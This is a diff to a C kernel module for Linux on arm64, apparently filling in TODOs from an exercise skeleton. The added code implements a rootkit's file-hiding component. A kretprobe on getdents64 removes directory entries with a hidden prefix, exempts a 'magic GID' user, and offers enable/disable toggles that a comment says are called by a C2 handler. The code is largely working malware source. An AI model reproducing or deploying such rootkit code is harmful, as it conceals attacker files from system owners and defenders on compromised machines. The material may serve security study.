@@ -26,42 +26,11 @@
 
 /* ─── Per-instance data passed from entry to return handler ───────────────── */
 
-/*
- * TODO: Define struct file_hide_data
- *
- * This struct is stored in kretprobe_instance->data. The entry handler
- * saves the userspace buffer pointer here so the return handler can find it.
- *
- * Fields:
- *   struct linux_dirent64 __user *dirp;   // userspace buffer pointer
- */
-
-struct cloak_data {
+struct file_hide_data {
 	struct linux_dirent64 __user *dirp;
 };
 
 /* ─── Entry handler ───────────────────────────────────────────────────────── */
-
-/*
- * TODO: Implement file_hide_entry()
- *
- * Called BEFORE __arm64_sys_getdents64 runs. Extract and save the userspace
- * buffer pointer so the return handler can modify the buffer later.
- *
- * AArch64 double pt_regs:
- *   regs->regs[0]  →  pointer to user pt_regs
- *   user_regs->regs[1]  →  dirp (the buffer pointer we need)
- *
- * Steps:
- * 1. Cast ri->data to struct file_hide_data*
- * 2. Get user pt_regs: (struct pt_regs *)regs->regs[0]
- * 3. Save dirp: data->dirp = (void __user *)user_regs->regs[1]
- * 4. Return 0
- *
- * Function signature:
- *   static int file_hide_entry(struct kretprobe_instance *ri,
- *                              struct pt_regs *regs)
- */
 
 static int file_hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
@@ -76,52 +45,68 @@ static int file_hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 
 /* ─── Return handler ──────────────────────────────────────────────────────── */
 
-/*
- * TODO: Implement file_hide_return()
- *
- * Called AFTER __arm64_sys_getdents64 returns. The dirent buffer is now
- * filled in userspace. Copy it to kernel space, filter out hidden entries,
- * and copy the modified buffer back.
- *
- * Steps:
- * 1. Get return value (byte count): ret = regs_return_value(regs)
- *    - If ret <= 0, nothing to filter — return 0
- * 2. Sanity check: if ret > MAX_BUF_SIZE, skip filtering
- * 3. kmalloc(ret, GFP_ATOMIC) — must use GFP_ATOMIC in probe context
- * 4. copy_from_user(kbuf, data->dirp, ret)
- * 5. Iterate linux_dirent64 entries:
- *    - pos = 0; while (pos < total_len)
- *    - entry = (struct linux_dirent64 *)(kbuf + pos)
- *    - If entry->d_reclen == 0, break (prevent infinite loop)
- *    - If entry->d_name starts with HIDDEN_PREFIX:
- *        memmove(kbuf + pos, kbuf + pos + entry->d_reclen,
- *                total_len - pos - entry->d_reclen)
- *        total_len -= entry->d_reclen
- *        (don't advance pos — next entry slid into this slot)
- *    - Else: pos += entry->d_reclen
- * 6. copy_to_user(data->dirp, kbuf, total_len)
- * 7. Adjust return value: regs->regs[0] = total_len
- * 8. kfree(kbuf)
- * 9. Return 0
- *
- * Function signature:
- *   static int file_hide_return(struct kretprobe_instance *ri,
- *                               struct pt_regs *regs)
- */
+static int file_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	struct file_hide_data *data = (struct file_hide_data *)ri->data;
+	struct linux_dirent64 __user *dirp = data->dirp;
+	struct linux_dirent64 *current_dir, *prev = NULL;
+	int total_bytes = regs_return_value(regs);
+	char *kbuf;
+	int offset = 0;
+
+	/* Nothing to filter if getdents64 returned 0 or error */
+	if (total_bytes <= 0)
+		return 0;
+
+	/* Privileged user sees everything */
+	if (guardian_has_magic_gid())
+		return 0;
+
+	/* Atomic because kretprobe handlers run in atomic context */
+	kbuf = kmalloc(total_bytes, GFP_ATOMIC);
+	if (!kbuf)
+		return 0;
+
+	if (copy_from_user(kbuf, dirp, total_bytes)) {
+		kfree(kbuf);
+		return 0;
+	}
+
+	/* Walk the dirent buffer and remove matching entries */
+	while (offset < total_bytes) {
+		current_dir = (struct linux_dirent64 *)(kbuf + offset);
+
+		if (strncmp(current_dir->d_name, HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) != 0) {
+			/* No match — advance */
+			prev = current_dir;
+			offset += current_dir->d_reclen;
+		} else if (prev) {
+			/* Match, not first entry: prev absorbs current */
+			prev->d_reclen += current_dir->d_reclen;
+			offset += current_dir->d_reclen;
+		} else {
+			/* Match, first entry: shift everything forward */
+			int reclen = current_dir->d_reclen;
+
+			total_bytes -= reclen;
+			memmove(kbuf, kbuf + reclen, total_bytes);
+			/* Don't advance offset — new data is at same position */
+		}
+	}
+
+	/* Write filtered buffer back to userspace and fix return value */
+	if (copy_to_user(dirp, kbuf, total_bytes)) {
+	kfree(kbuf);
+	return 0;
+	}
+
+	regs->regs[0] = total_bytes;
+
+	kfree(kbuf);
+	return 0;
+}
 
 /* ─── Kretprobe definition ────────────────────────────────────────────────── */
-
-/*
- * TODO: Define the kretprobe struct
- *
- * static struct kretprobe krp = {
- *     .handler       = file_hide_return,
- *     .entry_handler = file_hide_entry,
- *     .data_size     = sizeof(struct file_hide_data),
- *     .maxactive     = 20,
- *     .kp.symbol_name = "__arm64_sys_getdents64",
- * };
- */
 
 static struct kretprobe file_hide_krp = {
 	.handler       = file_hide_return,
@@ -137,50 +122,42 @@ static bool active;
 
 /* ─── Public interface ────────────────────────────────────────────────────── */
 
-/*
- * TODO: Implement file_hide_init()
- *
- * 1. Register the kretprobe: register_kretprobe(&krp)
- * 2. On success, set active = true and log with pr_info
- * 3. On failure, return the error code
- */
 int file_hide_init(void)
 {
   int ret = register_kretprobe(&file_hide_krp);
   if (ret < 0){
-    pr_err("failed to register kretprobe: %d\n", ret);
+    pr_err("[file_hide] [error] failed to register kretprobe: %d\n", ret);
     return ret;
   }
-	return -ENOSYS;
+
+  active = true;
+  pr_info("[file_hide] kretprobe registered\n");
+	return 0;
 }
 
-/*
- * TODO: Implement file_hide_exit()
- *
- * 1. If active, unregister the kretprobe: unregister_kretprobe(&krp)
- * 2. Log nmissed count: krp.nmissed (useful for debugging)
- * 3. Set active = false
- */
 void file_hide_exit(void)
 {
-	/* TODO */
+  if (!file_hide_is_active()) {
+    pr_err("[file_hide] [error] Could not unregister kretprobe (no kretprobe active)\n");
+    return;
+  }
+  
+  unregister_kretprobe(&file_hide_krp);
+  pr_info("[file_hide] nmissed counter:%d\n", file_hide_krp.nmissed);
+  active = false;
 }
 
 /*
- * TODO: Implement file_hide_enable() / file_hide_disable()
- *
  * These are called by the C2 handler for toggle commands.
- * enable() registers the kretprobe, disable() unregisters it.
  */
 int file_hide_enable(void)
 {
-	/* TODO */
-	return -ENOSYS;
+	return file_hide_init();
 }
 
 void file_hide_disable(void)
 {
-	/* TODO */
+  file_hide_exit();
 }
 
 bool file_hide_is_active(void)
